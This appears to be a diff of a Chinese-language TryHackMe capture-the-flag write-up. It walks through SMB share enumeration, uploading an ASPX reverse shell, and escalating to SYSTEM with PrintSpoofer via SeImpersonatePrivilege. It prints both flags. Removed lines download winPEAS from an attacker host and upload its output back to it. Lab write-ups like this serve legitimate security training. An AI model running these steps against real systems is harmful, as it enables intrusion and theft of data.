@@ -26,34 +26,34 @@ Nmap done: 1 IP address (1 host up) scanned in 448.90 seconds
 80和49663都开启了http服务，目录爆破没有发现什么有趣的东西
 445貌似存在永恒之蓝漏洞，但是没有攻击成功
 
-#samba 枚举,提示在\\10.10.207.135\nt4wrksv 里有一个passwords.txt文件
+#samba 枚举,提示在\\10.10.150.167\nt4wrksv 里有一个passwords.txt文件
 ```
 ┌──(root💀kali)-[~/tryhackme]
 └─# nmap --script "safe or smb-enum-*" -p 445 10.10.207.135 > smb.txt
 
 smb-enum-shares: 
 |   account_used: guest
-|   \\10.10.207.135\ADMIN$: 
+|   \\10.10.150.167\ADMIN$: 
 |     Type: STYPE_DISKTREE_HIDDEN
 |     Comment: Remote Admin
 |     Anonymous access: <none>
 |     Current user access: <none>
-|   \\10.10.207.135\C$: 
+|   \\10.10.150.167\C$: 
 |     Type: STYPE_DISKTREE_HIDDEN
 |     Comment: Default share
 |     Anonymous access: <none>
 |     Current user access: <none>
-|   \\10.10.207.135\IPC$: 
+|   \\10.10.150.167\IPC$: 
 |     Type: STYPE_IPC_HIDDEN
 |     Comment: Remote IPC
 |     Anonymous access: <none>
 |     Current user access: READ/WRITE
-|   \\10.10.207.135\nt4wrksv: 
+|   \\10.10.150.167\nt4wrksv: 
 |     Type: STYPE_DISKTREE
 |     Comment: 
 |     Anonymous access: <none>
 |_    Current user access: READ/WRITE
-| smb-ls: Volume \\10.10.207.135\nt4wrksv
+| smb-ls: Volume \\10.10.150.167\nt4wrksv
 | SIZE   TIME                 FILENAME
 | <DIR>  2020-07-25T15:10:05  .
 | <DIR>  2020-07-25T15:10:05  ..
@@ -110,7 +110,7 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 #成功上传一个asp文件,payload见：https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
 ```
 ┌──(root💀kali)-[~]
-└─# smbclient  //10.10.175.90/nt4wrksv 
+└─# smbclient  //10.10.150.167/nt4wrksv 
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.       
 smb: \> put /root/tryhackme/rev
@@ -152,16 +152,47 @@ type user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
 
-#把peas下载到temp目录
-powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/winPEASx64.exe' -OutFile 'c:\Windows\Temp\winPEASx64.exe'"
+#运行whoami /priv查看当前用户在系统中的权限
+```
+PS C:\inetpub\wwwroot\nt4wrksv> whoami /priv
+whoami /priv
 
-#创建一个文件夹
-new-item output.txt -type file
+PRIVILEGES INFORMATION
+----------------------
 
-#把peas全部输出到output.txt
-.\winPEASx64.exe *>output.txt
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
-Move-Item C:\Windows\Temp\output.txt  D:\temp\Test1
+```
 
-$body = Get-Content C:\Windows\Temp\output.txt
-Invoke-RestMethod -Uri http://10.13.21.169:1337/output.txt -Method PUT -Body $body
+#当前用户启用了SeImpersonatePrivilege，意味着可以利用令牌模拟来提升权限
+从https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0下载64位的PrintSpoofer64.exe，然后通过smb上传到windows靶机
+
+#提权
+PS C:\inetpub\wwwroot\nt4wrksv> .\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+
+#拿到root flag
+```
+PS C:\users\administrator\desktop> type root.txt
+type root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+PS C:\users\administrator\desktop> 
+```
